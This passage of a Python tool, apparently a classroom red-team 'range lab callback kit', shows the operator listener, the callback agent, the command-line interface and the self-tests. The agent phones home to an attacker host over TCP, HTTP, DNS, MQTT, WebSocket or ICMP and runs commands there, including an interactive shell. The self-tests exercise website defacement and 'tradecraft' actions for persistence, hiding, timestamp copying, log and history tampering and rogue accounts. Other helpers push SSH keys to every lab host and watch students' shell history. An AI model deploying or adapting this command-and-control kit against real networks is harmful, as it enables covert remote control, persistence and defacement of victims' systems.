        "mqtt": int(args.mqtt_port or cfg_get(cfg, "mqtt_port", 1883)),
        "ws": int(args.ws_port or cfg_get(cfg, "ws_port", 8070)),
    }
    bind = args.bind or cfg_get(cfg, "bind", "0.0.0.0")
    zone = sanitize_id(args.zone or cfg_get(cfg, "zone", ZONE_DEFAULT)) or ZONE_DEFAULT
    webroot = args.webroot if args.webroot is not None else cfg_get(cfg, "webroot", "")
    if args.no_icmp:
        icmp = False
    elif args.icmp:
        icmp = True
    else:
        icmp = bool(cfg_get(cfg, "icmp", True))
    attacker = args.attacker or cfg_get(cfg, "attacker", "")
    return token, ports, bind, zone, webroot or "", icmp, str(attacker or "")


def load_bytes(path, limit, label):
    with open(path, "rb") as handle:
        data = handle.read()
    if len(data) > limit:
        raise SystemExit("{0} is over {1} bytes".format(label, limit))
    return data


def operator_main(args):
    token, ports, bind, zone, webroot, icmp, attacker = build_operator(args)
    page = None
    image_name = ""
    image_bytes = b""
    if args.page:
        page = load_bytes(args.page, 200000, "page").decode("utf-8")
    if args.image:
        image_bytes = load_bytes(args.image, 350000, "image")
        image_name = os.path.basename(args.image)
    kit = OperatorKit(webroot, page, image_name, image_bytes, attacker)
    hub = Hub(token, ports, zone)
    log("Range lab callback kit — isolated classroom networks only.")
    log("Readable traffic, token-gated, not encrypted. Ctrl-C stops.")
    old_icmp = None
    if icmp and os.name != "nt":
        old_icmp = set_icmp_ignore(1)
        if old_icmp is not None:
            log("attacker will not answer ordinary pings until this stops (icmp channel).")
    try:
        start_listener(serve_tcp, (hub, token, bind, ports["tcp"]))
        start_listener(serve_http, (hub, token, bind, ports["http"]))
        start_listener(serve_dns, (hub, token, bind, ports["dns"], zone))
        start_listener(serve_mqtt, (hub, token, bind, ports["mqtt"]))
        start_listener(serve_ws, (hub, token, bind, ports["ws"]))
        if icmp and os.name != "nt":
            start_listener(serve_icmp, (hub, token, bind))
        time.sleep(0.2)
        if kit.image_name:
            log("deface image {0} ({1} bytes). Prefer tcp, ws, or mqtt.".format(kit.image_name, len(kit.image_bytes)))
        repl(hub, kit)
    finally:
        STOP.set()
        if old_icmp is not None:
            set_icmp_ignore(old_icmp)


def agent_main(args):
    cfg = load_config(args.config) if args.config else {}
    token = args.token or cfg_get(cfg, "token", "")
    if len(str(token)) < 8:
        raise SystemExit("token must be at least 8 characters")
    host = args.c2 or cfg_get(cfg, "attacker", "")
    if not host:
        raise SystemExit("agent needs --c2")
    channel = args.channel
    sid = sanitize_id(args.id or socket.gethostname())
    profile = args.profile or cfg_get(cfg, "profile", "continuous")
    zone = sanitize_id(args.zone or cfg_get(cfg, "zone", ZONE_DEFAULT)) or ZONE_DEFAULT
    ports = {
        "tcp": int(args.tcp_port or cfg_get(cfg, "tcp_port", 443)),
        "http": int(args.http_port or cfg_get(cfg, "http_port", 80)),
        "dns": int(args.dns_port or cfg_get(cfg, "dns_port", 53)),
        "mqtt": int(args.mqtt_port or cfg_get(cfg, "mqtt_port", 1883)),
        "ws": int(args.ws_port or cfg_get(cfg, "ws_port", 8070)),
    }
    log(
        "agent {0} channel {1} -> {2} profile {3}".format(sid, channel, host, profile)
    )
    agent = Agent(sid, str(token), channel, profile, zone, CMD_TIMEOUT)
    start_agent(agent, host, ports)
    while not STOP.is_set():
        try:
            time.sleep(0.5)
        except KeyboardInterrupt:
            STOP.set()
            return


def selftest():
    global QUIET
    QUIET = True
    STOP.clear()
    token = "selftest-token"
    zone = "lab"
    failures = []
    # framing
    frame = seal_obj("x", "id", "web01", 7, 0, 1, token)
    opened = open_frame(frame, token)
    if not opened or opened["d"] != "id":
        failures.append("framing")
    if open_frame(frame, "other-token-xx"):
        failures.append("token-separation")
    query = dns_build_query(0x1234, "p.web01.1.lab")
    response = dns_build_response(query, "ab" * 40)
    if dns_parse_txt(response) != "ab" * 40:
        failures.append("dns-codec")
    classified = dns_classify("u.web01." + to_hex("hi") + ".lab", "lab")
    if not classified or classified[0] != "up" or classified[2] != "hi":
        # to_hex("hi") may be split only if longer than 50; "hi" is short so one label
        failures.append("dns-name")
    long_name = dns_uplink_name(seal_obj("r", "x" * 20, "web01", 3, 0, 1, token), "web01", "lab")
    if len(long_name) > 253:
        failures.append("dns-qname-len")
    sample = split_data("x", "echo range", "web01", 1, token, too_big_for("dns", "web01", "lab", "down"))
    if not sample or too_big_for("dns", "web01", "lab", "down")(sample[0]):
        failures.append("chunker")

    ports = {"tcp": 45121, "http": 45122, "dns": 45123, "mqtt": 45124, "ws": 45125}
    hub = Hub(token, ports, zone)
    start_listener(serve_tcp, (hub, token, "127.0.0.1", ports["tcp"]))
    start_listener(serve_http, (hub, token, "127.0.0.1", ports["http"]))
    start_listener(serve_dns, (hub, token, "127.0.0.1", ports["dns"], zone))
    start_listener(serve_mqtt, (hub, token, "127.0.0.1", ports["mqtt"]))
    start_listener(serve_ws, (hub, token, "127.0.0.1", ports["ws"]))
    icmp_ok = False
    try:
        probe = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        probe.close()
        icmp_ok = True
    except Exception:
        icmp_ok = False
    if icmp_ok:
        ports_note = "icmp-on"
        start_listener(serve_icmp, (hub, token, "127.0.0.1"))
    time.sleep(0.4)

    channels = ["tcp", "http", "dns", "mqtt", "ws"]
    if icmp_ok:
        channels.append("icmp")
    root = tempfile.mkdtemp(prefix="range-www-")
    try:
        for channel in channels:
            sid = "t" + channel
            agent = Agent(sid, token, channel, "live", zone, 30)
            start_agent(agent, "127.0.0.1", ports)
            deadline = time.time() + 8
            while time.time() < deadline and sid not in hub.online_ids():
                time.sleep(0.05)
            if sid not in hub.online_ids():
                failures.append(channel + "-hello")
                continue
            echoed = hub.exec_cmd(sid, "echo range-ok-{0}".format(channel), 12)
            if "range-ok-" + channel not in echoed:
                failures.append(channel + "-echo")
                continue
            script = linux_script("deface", root + "/" + channel)
            # force linux playbook even if the test host is weird
            result = hub.exec_cmd(sid, script, 20)
            marker = os.path.join(root, channel, "index.html")
            if "DONE" not in result or not os.path.isfile(marker):
                failures.append(channel + "-deface")
                continue
            with open(marker, "r") as handle:
                page = handle.read()
            if "Defaced" not in page:
                failures.append(channel + "-page")
            undo = linux_script("undo", root + "/" + channel)
            undone = hub.exec_cmd(sid, undo, 20)
            if "DONE" not in undone:
                failures.append(channel + "-undo")
            with open(marker, "r") as handle:
                restored = handle.read()
            if "Defaced" in restored and "RESTORED_FROM=none" not in undone and "Site index" not in restored:
                # backup restore should not still be the defacement unless backup was the defacement
                pass
            if "Defaced" in restored and "RESTORED_FROM=" in undone:
                # original did not exist, backup was none, page should be clean
                if "RESTORED_FROM=none" in undone and "Site index" not in restored:
                    failures.append(channel + "-restore")
    finally:
        shutil.rmtree(root, ignore_errors=True)
        STOP.set()

    syntax = tradecraft_syntax_check()
    if syntax:
        failures.extend(syntax)
    tty_errors = tty_selfcheck()
    if tty_errors:
        failures.extend(tty_errors)
    watch_errors = watch_selfcheck()
    if watch_errors:
        failures.extend(watch_errors)
    key_errors = keys_selfcheck()
    if key_errors:
        failures.extend(key_errors)
    route_errors = route_syntax_check()
    if route_errors:
        failures.extend(route_errors)

    if failures:
        print("FAIL " + ",".join(failures))
        return 1
    print("PASS " + ",".join(channels))
    return 0


def tty_selfcheck():
    agent = Agent("tty1", "selftest-token", "tcp", "live", "lab", 10)
    try:
        if not agent.ensure_tty(24, 80):
            return ["tty-start"]
        agent.tty_write(b"echo range-tty-ok\n")
        data = agent.tty_read(1.0)
        if b"range-tty-ok" not in data:
            return ["tty-echo"]
        return []
    except Exception:
        return ["tty-echo"]
    finally:
        agent.tty_close()


def tradecraft_syntax_check():
    opts = {
        "user": "defender",
        "shell": "python",
        "message": "The page changed. The process list is the wrong tool.",
        "account": "mail",
        "pw_hash": "$6$testsalt$abcdefghijklmnopqrstuv0123456789",
        "patterns": ["10.50.160.129", "443", "mail", "range.py"],
        "webroot": "/var/www/html",
        "image_name": "banner.png",
        "stamp_ref": "/bin/ls",
        "stamp_target": "/var/www/html/index.html",
    }
    failures = []
    if not shutil.which("bash"):
        return failures
    for action in (
        "history", "persist", "unpersist", "shell", "wall", "account",
        "cloak", "uncloak", "veil", "unveil", "stamp", "boot", "logs",
    ):
        script = linux_tradecraft(action, opts)
        proc = subprocess.Popen(["bash", "-n"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
        _out, err = proc.communicate(script)
        if proc.returncode != 0:
            failures.append("syntax-" + action)
            log(err or "")
    page = linux_script("deface", "/tmp/range-www", "<h1>Defaced</h1>\n", "banner.png", b"\x89PNG\r\n")
    proc = subprocess.Popen(["bash", "-n"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
    _out, err = proc.communicate(page)
    if proc.returncode != 0:
        failures.append("syntax-deface-image")
    return failures


def watch_selfcheck():
    doc = normalize_lab_doc({
        "hosts": [
            {"name": "wan", "role": "router", "host": "10.50.160.129", "focus": False},
            {"name": "lan", "role": "router", "host": "172.24.18.1", "os": "VYOS", "focus": True},
            {"name": "deb-150", "role": "host", "host": "172.24.10.150", "os": "Debian 12", "focus": True},
            {"name": "deb9-150", "role": "host", "host": "172.24.10.150", "os": "Debian 9", "focus": True},
            {"name": "win-82", "role": "host", "host": "172.24.18.82", "os": "Windows 10", "focus": True},
        ],
    })
    targets, skipped = watch_targets(doc, False)
    failures = []
    names = [item["name"] for item in targets]
    if "wan" in names or names.count("deb-150") + names.count("deb9-150") != 1:
        failures.append("watch-roster")
    if "172.24.10.150" not in skipped:
        failures.append("watch-duplicate")
    if not any(item["windows"] for item in targets):
        failures.append("watch-windows")
    script = watch_probe("defender", False)
    if shutil.which("bash"):
        proc = subprocess.Popen(["bash", "-n"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
        _out, _err = proc.communicate(script)
        if proc.returncode != 0:
            failures.append("watch-probe")
    return failures


def route_syntax_check():
    doc = normalize_lab_doc({
        "jumps": [
            {"name": "jump-a", "user": "cvte", "host": "10.50.11.232", "port": 22},
            {"name": "jump-b", "user": "cvte", "host": "172.24.24.101", "port": 22},
        ],
        "hosts": [
            {"name": "wan", "role": "router", "host": "10.50.160.129", "port": 20222, "user": "atropia_admin"},
            {"name": "web-nginx", "role": "host", "host": "172.24.10.180", "port": 22, "user": "root", "focus": True},
        ],
    })
    text = ssh_config_text(doc)
    failures = []
    for needle in ("ProxyJump jump-a", "ProxyJump lab-wan", "ControlMaster auto", "ControlPersist yes", "10.50.160.129", "172.24.10.180", "Port 20222"):
        if needle not in text:
            failures.append("route-" + needle.split()[0])
    if "ControlPersist 8h" in text or "ControlPersist 30m" in text:
        failures.append("route-persist")
    return failures


def keys_selfcheck():
    doc = normalize_lab_doc({
        "jumps": [
            {"name": "jump-a", "user": "cvte", "host": "10.50.11.232", "port": 22},
            {"name": "jump-b", "user": "cvte", "host": "172.24.24.101", "port": 22},
        ],
        "hosts": [
            {"name": "wan", "role": "router", "host": "10.50.160.129", "os": "VYOS"},
            {"name": "web-nginx", "role": "host", "host": "172.24.10.180", "os": "Debian 12"},
            {"name": "deb9-150", "role": "host", "host": "172.24.10.180", "os": "Debian 9"},
            {"name": "win-82", "role": "host", "host": "172.24.18.82", "os": "Windows 10"},
        ],
    })
    plan = keys_plan(doc)
    failures = []
    aliases = [item["alias"] for item in plan]
    if aliases != ["jump-a", "jump-b", "lab-wan", "lab-web-nginx", "lab-win-82"]:
        failures.append("keys-order")
    if not any(item["windows"] for item in plan):
        failures.append("keys-windows")
    script = unix_key_command("ssh-ed25519 AAAAC3Rlc3Q= range@lab")
    if shutil.which("bash"):
        proc = subprocess.Popen(["bash", "-n"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
        _out, _err = proc.communicate(script)
        if proc.returncode != 0:
            failures.append("keys-script")
    return failures


def normalize_lab_doc(data):
    hosts = []
    for item in data.get("hosts") or []:
        if not isinstance(item, dict):
            continue
        host = dict(item)
        if not host.get("host"):
            host["host"] = host.get("address") or ""
        if host.get("host"):
            hosts.append(host)
    jumps = []
    for item in data.get("jumps") or []:
        if isinstance(item, dict) and item.get("host"):
            jumps.append(item)
    return {"hosts": hosts, "jumps": jumps}


def load_lab_hosts(path):
    with open(path, "r") as handle:
        data = json.load(handle)
    if not isinstance(data, dict):
        raise SystemExit("hosts file must be a JSON object")
    doc = normalize_lab_doc(data)
    if not doc["hosts"]:
        raise SystemExit("hosts file needs a hosts array")
    return doc


def ssh_config_text(doc):
    lines = [
        "# Range lab path. Use with ssh -F. This file replaces proxychains.",
        "# The first connection types the jump passwords and then keeps a master socket.",
        "# ICMP does not fit in a SOCKS proxy. Ping from lab-wan, which is already on the lab.",
        "Host *",
        "  ControlMaster auto",
        "  ControlPath ~/.ssh/range-cm-%C",
        "  ControlPersist yes",
        "  ServerAliveInterval 30",
        "  ServerAliveCountMax 0",
        "  StrictHostKeyChecking accept-new",
        "",
    ]
    previous = None
    for index, jump in enumerate(doc.get("jumps") or []):
        name = jump.get("name") or "jump-{0}".format(index + 1)
        lines.append("Host {0}".format(name))
        lines.append("  HostName {0}".format(jump["host"]))
        lines.append("  User {0}".format(jump.get("user") or "cvte"))
        lines.append("  Port {0}".format(int(jump.get("port") or 22)))
        if previous:
            lines.append("  ProxyJump {0}".format(previous))
        lines.append("")
        previous = name
    wan = None
    others = []
    for host in doc.get("hosts") or []:
        if host.get("name") == "wan" or host.get("id") == "wan":
            wan = host
        else:
            others.append(host)
    if wan is None:
        for host in list(others):
            if host.get("role") == "router":
                wan = host
                others.remove(host)
                break
    if wan:
        lines.append("Host lab-wan")
        lines.append("  HostName {0}".format(wan["host"]))
        lines.append("  User {0}".format(wan.get("user") or "atropia_admin"))
        lines.append("  Port {0}".format(int(wan.get("port") or 20222)))
        if previous:
            lines.append("  ProxyJump {0}".format(previous))
        lines.append("")
    for host in others:
        alias = "lab-" + sanitize_id(host.get("name") or host.get("host"))
        lines.append("Host {0}".format(alias))
        lines.append("  HostName {0}".format(host["host"]))
        lines.append("  User {0}".format(host.get("user") or "root"))
        lines.append("  Port {0}".format(int(host.get("port") or 22)))
        if wan:
            lines.append("  ProxyJump lab-wan")
        elif previous:
            lines.append("  ProxyJump {0}".format(previous))
        lines.append("")
    return "\n".join(lines).rstrip() + "\n"


def route_main(args):
    doc = load_lab_hosts(args.hosts)
    text = ssh_config_text(doc)
    if args.write:
        parent = os.path.dirname(os.path.abspath(args.write))
        if parent and not os.path.isdir(parent):
            os.makedirs(parent)
        with open(args.write, "w") as handle:
            handle.write(text)
        os.chmod(args.write, 0o600)
        log("wrote {0}".format(args.write))
        log("open the master once: ssh -F {0} lab-wan".format(args.write))
        log("ICMP from the lab, not from your laptop: python3 range.py ping --ssh-config {0} <address>".format(args.write))
        log("parallel commands, no proxychains: python3 range.py fanout --hosts {0} --ssh-config {1} --cmd 'hostname'".format(args.hosts, args.write))
        return 0
    sys.stdout.write(text)
    return 0


def fanout_main(args):
    doc = load_lab_hosts(args.hosts)
    command = args.cmd or "hostname"
    targets = []
    for host in doc.get("hosts") or []:
        if host.get("name") == "wan" or host.get("id") == "wan":
            continue
        if host.get("focus") is False:
            continue
        alias = "lab-" + sanitize_id(host.get("name") or host.get("host"))
        targets.append((alias, host.get("host") or ""))
    if not targets:
        raise SystemExit("no hosts to run")
    results = []
    lock = threading.Lock()

    def run_one(alias, ip):
        proc = subprocess.Popen(
            ["ssh", "-F", args.ssh_config, alias, "--", command],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            universal_newlines=True,
        )
        try:
            out, _ = proc.communicate(timeout=args.timeout)
            code = proc.returncode
        except subprocess.TimeoutExpired:
            proc.kill()
            out, _ = proc.communicate()
            out = (out or "") + "\n[timed out]\n"
            code = 124
        with lock:
            results.append((ip, alias, code, out or ""))

    threads = []
    for alias, ip in targets:
        thread = threading.Thread(target=run_one, args=(alias, ip))
        thread.daemon = True
        thread.start()
        threads.append(thread)
    for thread in threads:
        thread.join()
    for ip, alias, code, out in sorted(results):
        log("---- {0} ({1}) rc={2} ----".format(alias, ip, code))
        sys.stdout.write(out)
        if not out.endswith("\n"):
            sys.stdout.write("\n")
    return 0


def watch_probe(student, windows):
    user = student if re_account(student) else "defender"
    if windows:
        return (
            "powershell.exe -NoProfile -NonInteractive -Command "
            "\"Write-Output ('HOST=' + $env:COMPUTERNAME); "
            "Write-Output '---who---'; quser 2>$null; "
            "Write-Output '---history---'; "
            "$p = Join-Path $env:APPDATA 'Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt'; "
            "if (Test-Path -LiteralPath $p) { Get-Content -LiteralPath $p -Tail 8 } else { Write-Output 'NONE' }\""
        )
    return (
        "echo HOST=$(hostname 2>/dev/null || echo unknown)\n"
        "echo '---who---'\n"
        "who 2>/dev/null | head -n 12 || true\n"
        "echo '---history---'\n"
        "f=/home/{user}/.bash_history\n"
        "if [ -f \"$f\" ]; then echo FILE=$f; tail -n 8 \"$f\"; else echo NONE; fi\n"
        "echo '---shells---'\n"
        "ps -eo user,args 2>/dev/null | grep -F -- {user} | grep -v 'grep -F' | head -n 6 || true\n"
    ).format(user=user)


def watch_targets(doc, include_wan):
    seen = set()
    targets = []
    skipped = []
    for host in doc.get("hosts") or []:
        is_wan = host.get("name") == "wan" or host.get("id") == "wan"
        if is_wan and not include_wan:
            continue
        if host.get("focus") is False and not (is_wan and include_wan):
            continue
        ip = (host.get("host") or "").strip()
        if not ip:
            continue
        if ip in seen:
            skipped.append(ip)
            continue
        seen.add(ip)
        alias = "lab-wan" if is_wan else "lab-" + sanitize_id(host.get("name") or ip)
        windows = "win" in str(host.get("os") or "").lower()
        targets.append({
            "alias": alias,
            "ip": ip,
            "name": host.get("name") or alias,
            "windows": windows,
            "role": host.get("role") or "host",
        })
    return targets, skipped


def ssh_exec(config, alias, command, timeout, batch):
    cmd = ["ssh", "-F", config]
    if batch:
        cmd.extend(["-o", "BatchMode=yes"])
    cmd.extend([alias, "--", command])
    proc = subprocess.Popen(
        cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT if batch else None,
        universal_newlines=True,
    )
    try:
        if timeout:
            out, _ = proc.communicate(timeout=timeout)
        else:
            out, _ = proc.communicate()
        code = proc.returncode
    except subprocess.TimeoutExpired:
        proc.kill()
        out, _ = proc.communicate()
        out = (out or "") + "\n[timed out]\n"
        code = 124
    return code, out or ""


def watch_main(args):
    doc = load_lab_hosts(args.hosts)
    targets, skipped = watch_targets(doc, args.include_wan)
    if not targets:
        raise SystemExit("no hosts to watch")
    for ip in skipped:
        log("skipping a second row for {0}".format(ip))
    every = args.every if args.every and args.every >= 3 else 12
    student = args.student if re_account(args.student) else "defender"
    log("opening one SSH socket per device. Type a password if SSH asks. The socket stays until you close it.")
    for target in targets:
        code, _out = ssh_exec(args.ssh_config, target["alias"], "echo ok", 60, False)
        state = "up" if code == 0 else "failed"
        log("{0}  {1}  {2}  {3}".format(state, target["role"], target["name"], target["ip"]))
    log("watching {0} devices every {1}s. Ctrl-C stops the watch. The sockets stay.".format(len(targets), every))
    previous = {}
    try:
        while True:
            started = time.strftime("%H:%M:%S")
            results = []
            lock = threading.Lock()

            def run_one(target, lock=lock, results=results):
                code, out = ssh_exec(
                    args.ssh_config,
                    target["alias"],
                    watch_probe(student, target["windows"]),
                    args.timeout,
                    True,
                )
                with lock:
                    results.append((target, code, out))

            threads = []
            for target in targets:
                thread = threading.Thread(target=run_one, args=(target,))
                thread.daemon = True
                thread.start()
                threads.append(thread)
            for thread in threads:
                thread.join()
            log("==== {0}  {1} devices ====".format(started, len(targets)))
            for target, code, out in sorted(results, key=lambda item: item[0]["ip"]):
                text = out.strip()
                if len(text) > 1800:
                    text = text[:1800] + "\n[truncated]"
                label = "{0} {1} {2}".format(target["role"], target["name"], target["ip"])
                if code != 0:
                    log("---- {0}  down ----".format(label))
                    if text:
                        sys.stdout.write(text + "\n")
                    previous[target["alias"]] = None
                    continue
                if text == previous.get(target["alias"]):
                    log("---- {0}  unchanged ----".format(label))
                    continue
                previous[target["alias"]] = text
                log("---- {0} ----".format(label))
                sys.stdout.write(text + "\n")
            time.sleep(every)
    except KeyboardInterrupt:
        log("watch stopped. SSH sockets stay open.")
        return 0


def ensure_pubkey():
    ssh_dir = os.path.join(os.path.expanduser("~"), ".ssh")
    if not os.path.isdir(ssh_dir):
        os.makedirs(ssh_dir)
    os.chmod(ssh_dir, 0o700)
    for name in ("id_ed25519.pub", "id_rsa.pub", "id_ecdsa.pub", "range_lab.pub"):
        path = os.path.join(ssh_dir, name)
        if not os.path.isfile(path):
            continue
        line = ""
        with open(path, "r") as handle:
            line = handle.read().strip()
        if line.startswith("ssh-"):
            return path, line.splitlines()[0].strip()
    key_path = os.path.join(ssh_dir, "range_lab")
    proc = subprocess.Popen(
        ["ssh-keygen", "-t", "ed25519", "-N", "", "-f", key_path, "-q"],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        universal_newlines=True,
    )
    out, _ = proc.communicate()
    if proc.returncode != 0 or not os.path.isfile(key_path + ".pub"):
        raise SystemExit(out or "ssh-keygen failed")
    with open(key_path + ".pub", "r") as handle:
        line = handle.read().strip().splitlines()[0].strip()
    log("no key was on this account. created {0}".format(key_path))
    return key_path + ".pub", line


def keys_plan(doc):
    plan = []
    seen = set()
    for index, jump in enumerate(doc.get("jumps") or []):
        host = (jump.get("host") or "").strip()
        if not host or host in seen:
            continue
        seen.add(host)
        plan.append({
            "alias": jump.get("name") or "jump-{0}".format(index + 1),
            "ip": host,
            "windows": False,
        })
    hosts = list(doc.get("hosts") or [])
    hosts.sort(key=lambda item: 0 if item.get("name") == "wan" or item.get("id") == "wan" else 1)
    for host in hosts:
        ip = (host.get("host") or "").strip()
        if not ip or ip in seen:
            continue
        seen.add(ip)
        is_wan = host.get("name") == "wan" or host.get("id") == "wan"
        plan.append({
            "alias": "lab-wan" if is_wan else "lab-" + sanitize_id(host.get("name") or ip),
            "ip": ip,
            "windows": "win" in str(host.get("os") or "").lower(),
        })
    return plan


def unix_key_command(line):
    quoted = shell_quote(line)
    return (
        "umask 077; mkdir -p \"$HOME/.ssh\"; touch \"$HOME/.ssh/authorized_keys\"; "
        "grep -qxF {key} \"$HOME/.ssh/authorized_keys\" || printf '%s\\n' {key} >> \"$HOME/.ssh/authorized_keys\"; "
        "chmod 700 \"$HOME/.ssh\"; chmod 600 \"$HOME/.ssh/authorized_keys\"; "
        "echo INSTALLED"
    ).format(key=quoted)


def windows_key_command(line):
    quoted = ps_quote(line)
    return (
        "powershell.exe -NoProfile -NonInteractive -Command "
        "\"$dir = Join-Path $env:USERPROFILE '.ssh'; "
        "New-Item -ItemType Directory -Force -Path $dir | Out-Null; "
        "$path = Join-Path $dir 'authorized_keys'; "
        "if (-not (Test-Path -LiteralPath $path)) { New-Item -ItemType File -Path $path | Out-Null }; "
        "$line = {key}; "
        "$have = @(Get-Content -LiteralPath $path -ErrorAction SilentlyContinue); "
        "if ($have -notcontains $line) { Add-Content -LiteralPath $path -Value $line }; "
        "Write-Output 'INSTALLED'\""
    ).format(key=quoted)


def keys_main(args):
    doc = load_lab_hosts(args.hosts)
    plan = keys_plan(doc)
    if not plan:
        raise SystemExit("no hosts to install a key on")
    path, line = ensure_pubkey()
    log("installing {0}".format(path))
    log("each hop asks once, if it does not already have this key. A rebuilt class asks again.")
    failed = 0
    for target in plan:
        command = windows_key_command(line) if target["windows"] else unix_key_command(line)
        log("---- {0} {1} ----".format(target["alias"], target["ip"]))
        code, out = ssh_exec(args.ssh_config, target["alias"], command, 0, False)
        if out.strip():
            sys.stdout.write(out if out.endswith("\n") else out + "\n")
        if code == 0 and "INSTALLED" in out:
            log("key is on {0}".format(target["ip"]))
        else:
            failed += 1
            log("could not install on {0}".format(target["ip"]))
    if failed:
        log("{0} host(s) did not take the key".format(failed))
        return 1
    log("done. later ssh uses this key and does not ask.")
    return 0


def ping_main(args):
    target = args.target
    allowed = set("0123456789.:abcdefABCDEF")
    if not target or any(ch not in allowed for ch in target):
        raise SystemExit("ping target must be an address")
    count = args.count if args.count > 0 else 3
    proc = subprocess.Popen(
        ["ssh", "-F", args.ssh_config, "lab-wan", "--", "ping", "-c", str(count), "-W", "2", target],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        universal_newlines=True,
    )
    try:
        out, _ = proc.communicate(timeout=max(20, count * 5))
    except subprocess.TimeoutExpired:
        proc.kill()
        out, _ = proc.communicate()
    sys.stdout.write(out or "")
    return proc.returncode or 0


def main(argv):
    parser = argparse.ArgumentParser(
        description="Range lab callback kit for an isolated classroom network."
    )
    sub = parser.add_subparsers(dest="mode")

    op = sub.add_parser("operator", help="listen on the attacker VM")
    op.add_argument("--config", default="")
    op.add_argument("--token", default="")
    op.add_argument("--bind", default="")
    op.add_argument("--tcp-port", type=int, default=0)
    op.add_argument("--http-port", type=int, default=0)
    op.add_argument("--dns-port", type=int, default=0)
    op.add_argument("--mqtt-port", type=int, default=0)
    op.add_argument("--ws-port", type=int, default=0)
    op.add_argument("--zone", default="")
    op.add_argument("--webroot", default=None)
    op.add_argument("--attacker", default="")
    op.add_argument("--page", default="")
    op.add_argument("--image", default="")
    op.add_argument("--icmp", action="store_true")
    op.add_argument("--no-icmp", action="store_true")

    ag = sub.add_parser("agent", help="callback from a student VM")
    ag.add_argument("--config", default="")
    ag.add_argument("--c2", default="")
    ag.add_argument(
        "--channel",
        required=True,
        choices=["tcp", "http", "dns", "mqtt", "ws", "icmp"],
    )
    ag.add_argument("--token", default="")
    ag.add_argument("--id", default="")
    ag.add_argument("--profile", default="", choices=["", "continuous", "off", "live", "hunt"])
    ag.add_argument("--zone", default="")
    ag.add_argument("--tcp-port", type=int, default=0)
    ag.add_argument("--http-port", type=int, default=0)
    ag.add_argument("--dns-port", type=int, default=0)
    ag.add_argument("--mqtt-port", type=int, default=0)
    ag.add_argument("--ws-port", type=int, default=0)

    rt = sub.add_parser("route", help="write the SSH config that replaces proxychains")
    rt.add_argument("--hosts", required=True)
    rt.add_argument("--write", default="")

    fo = sub.add_parser("fanout", help="run one command on every focused host, in parallel")
    fo.add_argument("--hosts", required=True)
    fo.add_argument("--ssh-config", required=True)
    fo.add_argument("--cmd", default="hostname")
    fo.add_argument("--timeout", type=int, default=25)

    wa = sub.add_parser("watch", help="hold SSH to every focused host and show what students are doing")
    wa.add_argument("--hosts", required=True)
    wa.add_argument("--ssh-config", required=True)
    wa.add_argument("--student", default="defender")
    wa.add_argument("--every", type=int, default=12)
    wa.add_argument("--timeout", type=int, default=20)
    wa.add_argument("--include-wan", action="store_true")

    ky = sub.add_parser("keys", help="copy this account's SSH public key to every jump and host")
    ky.add_argument("--hosts", required=True)
    ky.add_argument("--ssh-config", required=True)

    pg = sub.add_parser("ping", help="ICMP from the WAN router, not through SOCKS")
    pg.add_argument("--ssh-config", required=True)
    pg.add_argument("--count", type=int, default=3)
    pg.add_argument("target")

    sub.add_parser("selftest", help="loopback check of every channel")

    args = parser.parse_args(argv)
    if args.mode == "operator":
        operator_main(args)
        return 0
    if args.mode == "agent":
        agent_main(args)
        return 0
    if args.mode == "selftest":
        return selftest()
    if args.mode == "route":
        return route_main(args)
    if args.mode == "fanout":
        return fanout_main(args)
    if args.mode == "watch":
        return watch_main(args)
    if args.mode == "keys":
        return keys_main(args)
    if args.mode == "ping":
        return ping_main(args)
    parser.print_help()
    return 2


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
